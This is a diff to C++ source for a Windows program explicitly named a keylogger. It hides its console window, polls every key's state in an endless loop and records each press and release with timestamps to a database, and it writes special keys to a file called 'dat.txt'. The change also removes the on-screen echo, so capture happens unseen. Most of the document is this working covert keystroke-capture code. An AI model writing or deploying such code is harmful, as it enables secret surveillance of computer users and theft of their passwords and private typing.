@@ -1,4 +1,4 @@
-﻿#pragma once
+﻿#include "keylogger.h"
 
 #define _WIN32_WINNT 0x0500
 #include <Windows.h>
@@ -7,10 +7,50 @@
 #include <stdio.h>
 #include <iostream>
 #include <fstream>
+#include <thread>
+#include <chrono>
 
-using namespace std;
+uint64_t timeSinceEpochMillisec() 
+{
+    using namespace std::chrono;
+    return duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count();
+}
 
-void LOG(std::string input)
+void Keylogger::start(Database db)
+{
+    m_db = db;
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
+    char KEY = 'x';
+    int prevKey = 0;
+    int prevKeys[200] = {0};
+
+    while (true) {
+        for (int KEY = 8; KEY <= 190; KEY++)
+        {
+            if (GetAsyncKeyState(KEY) == -32767)
+            {
+                if (prevKeys[KEY] == -32768)
+                {
+                    continue;
+                }
+                if (SpecialKeys(KEY) == false)
+                {
+                    const uint64_t time = timeSinceEpochMillisec();
+                    m_db.insertKeyboardKey("keyboard", time, KEY, 0);
+                }
+            }
+            else if (prevKeys[KEY] == -32768 && GetAsyncKeyState(KEY) == 0)
+            {
+                const uint64_t time = timeSinceEpochMillisec();
+                m_db.insertKeyboardKey("keyboard", time, KEY, 1);
+            }
+
+            prevKeys[KEY] = GetAsyncKeyState(KEY);
+        }
+    }
+}
+
+void Keylogger::LOG(std::string input)
 {
     std::fstream LogFile;
     LogFile.open("dat.txt", std::fstream::app);
@@ -20,66 +60,51 @@ void LOG(std::string input)
     }
 }
 
-bool SpecialKeys(int S_Key) {
+bool Keylogger::SpecialKeys(int S_Key) {
     switch (S_Key) {
     case VK_SPACE:
-        cout << " ";
         LOG(" ");
         return true;
     case VK_RETURN:
-        cout << "\n";
         LOG("\n");
         return true;
     case '¾':
-        cout << ".";
         LOG(".");
         return true;
     case VK_SHIFT:
-        cout << "#SHIFT#";
         LOG("#SHIFT#");
         return true;
     case VK_BACK:
-        cout << "\b";
         LOG("\b");
         return true;
     case VK_RBUTTON:
-        cout << "#R_CLICK#";
         LOG("#R_CLICK#");
         return true;
     case VK_CAPITAL:
-        cout << "#CAPS_LOCK#";
         LOG("#CAPS_LCOK");
         return true;
     case VK_TAB:
-        cout << "#TAB";
         LOG("#TAB");
         return true;
     case VK_UP:
-        cout << "#UP";
         LOG("#UP_ARROW_KEY");
         return true;
     case VK_DOWN:
-        cout << "#DOWN";
         LOG("#DOWN_ARROW_KEY");
         return true;
     case VK_LEFT:
-        cout << "#LEFT";
         LOG("#LEFT_ARROW_KEY");
         return true;
     case VK_RIGHT:
-        cout << "#RIGHT";
         LOG("#RIGHT_ARROW_KEY");
         return true;
     case VK_CONTROL:
-        cout << "#CONTROL";
         LOG("#CONTROL");
         return true;
     case VK_MENU:
-        cout << "#ALT";
         LOG("#ALT");
         return true;
     default:
         return false;
     }
 }
-
